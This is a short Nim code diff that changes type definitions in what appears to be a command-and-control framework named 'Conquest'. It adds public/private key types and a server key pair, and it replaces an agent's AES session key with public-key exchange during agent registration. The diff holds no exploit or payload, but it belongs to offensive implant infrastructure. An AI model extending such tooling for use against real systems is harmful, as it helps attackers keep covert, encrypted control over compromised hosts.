@@ -52,6 +52,8 @@ type
 # Encryption 
 type     
     Key* = array[32, byte]
+    PublicKey* = array[32, byte]
+    PrivateKey* = array[64, byte]
     Iv* = array[12, byte]
     AuthenticationTag* = array[16, byte]
 
@@ -133,7 +135,7 @@ type
 
     AgentRegistrationData* = object
         header*: Header
-        sessionKey*: Key        # [32 bytes ] AES 256 session key
+        agentPublicKey*: Key        # [32 bytes ] Public key of the connecting agent for key exchange
         metadata*: AgentMetadata
 
 # Agent structure
@@ -168,12 +170,17 @@ type
 
 # Server structure
 type 
+    KeyPair* = object 
+        privateKey*: PrivateKey 
+        publicKey*: Key
+
     Conquest* = ref object
         prompt*: Prompt
         dbPath*: string
         listeners*: Table[string, Listener]
         agents*: Table[string, Agent]
         interactAgent*: Agent
+        keyPair*: KeyPair
 
 # Agent Config
 type
@@ -184,3 +191,4 @@ type
         port*: int
         sleep*: int
         sessionKey*: Key
+        agentPublicKey*: PublicKey
